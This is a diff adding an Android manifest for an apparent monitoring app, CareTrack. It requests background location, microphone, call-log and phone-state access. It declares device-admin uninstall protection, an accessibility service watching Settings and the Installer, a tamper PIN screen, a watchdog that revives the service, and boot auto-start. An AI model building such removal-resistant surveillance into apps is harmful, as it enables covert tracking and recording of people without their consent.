@@ -1,0 +1,111 @@
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.ACTIVITY_RECOGNITION" />
+    <uses-permission android:name="com.google.android.gms.permission.ACTIVITY_RECOGNITION" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+
+    <application
+      android:name=".MainApplication"
+      android:label="@string/app_name"
+      android:icon="@mipmap/ic_launcher"
+      android:roundIcon="@mipmap/ic_launcher_round"
+      android:allowBackup="false"
+      android:theme="@style/AppTheme"
+      android:supportsRtl="true">
+      <activity
+        android:name=".MainActivity"
+        android:label="@string/app_name"
+        android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode"
+        android:launchMode="singleTask"
+        android:windowSoftInputMode="adjustResize"
+        android:exported="true">
+        <intent-filter>
+            <action android:name="android.intent.action.MAIN" />
+            <category android:name="android.intent.category.LAUNCHER" />
+        </intent-filter>
+      </activity>
+
+      <!-- Tamper Guard PIN Challenge Activity -->
+      <activity
+        android:name=".TamperUnlockActivity"
+        android:theme="@android:style/Theme.NoTitleBar.Fullscreen"
+        android:launchMode="singleTop"
+        android:excludeFromRecents="true"
+        android:exported="false" />
+
+      <!-- Device Administrator Receiver for uninstall protection -->
+      <receiver
+        android:name=".CareTrackAdminReceiver"
+        android:label="@string/app_name"
+        android:description="@string/device_admin_description"
+        android:permission="android.permission.BIND_DEVICE_ADMIN"
+        android:exported="true">
+        <meta-data
+            android:name="android.app.device_admin"
+            android:resource="@xml/device_admin_policies" />
+        <intent-filter>
+            <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+        </intent-filter>
+      </receiver>
+
+      <!-- Accessibility Guard Service for Settings and Installer monitoring -->
+      <service
+        android:name=".CareTrackAccessibilityGuardService"
+        android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+        android:label="@string/app_name"
+        android:exported="true">
+        <intent-filter>
+            <action android:name="android.accessibilityservice.AccessibilityService" />
+        </intent-filter>
+        <meta-data
+            android:name="android.accessibilityservice"
+            android:resource="@xml/accessibility_service_config" />
+      </service>
+
+      <!-- Permanent Background Location & Surroundings Check Foreground Service -->
+      <service
+        android:name=".CareTrackLocationService"
+        android:foregroundServiceType="location|microphone"
+        android:exported="false" />
+
+      <!-- Activity Transition Receiver for motion detection -->
+      <receiver
+        android:name=".ActivityTransitionReceiver"
+        android:exported="false" />
+
+      <!-- Watchdog Receiver to auto-resurrect service on silent death -->
+      <receiver
+        android:name=".WatchdogReceiver"
+        android:exported="false">
+        <intent-filter>
+          <action android:name="com.helloworld.WATCHDOG_CHECK" />
+        </intent-filter>
+      </receiver>
+
+      <!-- Auto-restart on device reboot -->
+      <receiver
+        android:name=".BootReceiver"
+        android:exported="true">
+        <intent-filter>
+          <action android:name="android.intent.action.BOOT_COMPLETED" />
+          <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+        </intent-filter>
+      </receiver>
+    </application>
+</manifest>
+
